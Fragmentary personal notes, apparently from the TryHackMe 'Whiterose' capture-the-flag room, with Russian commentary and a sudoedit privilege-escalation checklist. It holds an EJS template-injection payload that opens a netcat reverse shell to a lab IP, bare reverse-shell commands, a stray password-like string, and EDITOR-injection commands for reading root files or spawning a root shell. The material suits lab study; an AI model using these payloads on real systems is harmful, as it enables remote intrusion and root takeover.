ttps://0xb0b.gitbook.io/writeups/tryhackme/2024/whiterose#web-access-olivia-cortzez
	https://eslam.io/posts/ejs-server-side-template-injection-rce/
	https://github.com/mde/ejs/issues/720
	name=a&passord=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "busybox nc 10.8.134.24 4446 -e sh"');//

![[Pasted image 20250527232010.png]]

busybox nc 10.8.134.24 4446 -e sh
nc 10.8.134.24 4446 -e sh
python3 -c 'import pty; pty.spawn("/bin/bash")

'p~]P@5!6;rs558:q'

**Gayle Bev**

```
export EDITOR="vi -- /root/root.txt"
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

самое интересное, вход к руту
## 🔍 `sudoedit` CTF-чеклист

### 📋 1. **Посмотри, есть ли `sudoedit`**

```
sudo -l
```

👉 Ищи строки типа:

```
(root) NOPASSWD: sudoedit /путь/к/файлу
```

🧠 2. **Пойми, от чьего имени выполняется (`root`) и на какие файлы есть доступ**

- Если ты можешь редачить **любой файл с root-доступом**, это уже почти shell.
    
- Если файл "скучный" — проверь, не можешь ли **обмануть `EDITOR`**, чтобы отредактировать другой файл.

🪄 3. **Пробуй "инъекцию" через `$EDITOR`**

```
export EDITOR="vi -- /root/root.txt"
sudo sudoedit /some/path/file
```

```
EDITOR="vim -c ':!/bin/bash'" sudoedit /some/path/file
```

🧠 Суть: **редактор может делать больше, чем просто редактировать**, и ты этим пользуешься.

🧪 4. **Проверяй, какая версия `sudo`**

```
sudoedit -V
```

👉 Если версия **до 1.9.5p2** — возможен `EDITOR=bash` эксплойт (старый баг).  
Если **новее** — он отфильтрует подозрительное.

🧨 5. **Если файл веб-сервера — ищи RCE**

```
location /shell {
    root /var/www/html;
    autoindex on;
}
```


или заливаешь webshell через proxy_pass.

### 🔐 6. **Если не даёт shell — найди, как вызвать reload**

- Иногда `nginx` или `supervisor` смотрит на конфиг-файл, и ты его можешь редактировать, а затем:
```
curl http://127.0.0.1:PORT/reload
или
sudo systemctl restart nginx
```

📊 Визуалка (в духе майндмэп):

```
              +--------------------+
              |  sudoedit access   |
              +--------------------+
                        |
          +-------------+-------------+
          |                           |
     Can edit file?             Inject EDITOR?
          |                           |
    +-----+-----+              +------+------+
    | Web config? |            | vi/bash/vim? |
    +-----+-----+              +------+------+
          |                           |
    Inject RCE to config         Read/write other files
          |                           |
    Reload service?            Maybe get shell or flag

```
🧠 Запомни правило: **где `sudoedit`, там почти всегда дырка**, если редактор не зажат.




